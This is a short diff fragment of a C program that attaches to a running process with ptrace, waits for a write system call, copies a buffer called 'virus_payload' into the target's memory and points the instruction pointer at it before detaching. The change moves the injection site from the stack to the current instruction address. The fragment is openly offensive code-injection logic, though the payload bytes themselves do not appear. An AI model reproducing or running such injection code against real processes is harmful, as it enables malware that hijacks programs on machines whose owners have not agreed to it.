@@ -48,10 +48,10 @@ int main(int argc, char *argv[])
             ptrace(PTRACE_GETREGS, pid, NULL, &registers);
             if(registers.orig_rax == SYS_write)
             {
-                long addr = registers.rsp-1024;
+                long addr = registers.rip;//rsp-1024;
                 inject_code(pid, addr, strlen(virus_payload), (void *)virus_payload);
 
-                registers.rip = addr+2;
+                registers.rip = addr;//+2;
                 printf("[+] RIP now points to 0x%0.16x\n", registers.rip);
                 ptrace(PTRACE_SETREGS, pid, 0, &registers);
                 ptrace(PTRACE_DETACH, pid, 0, 0);
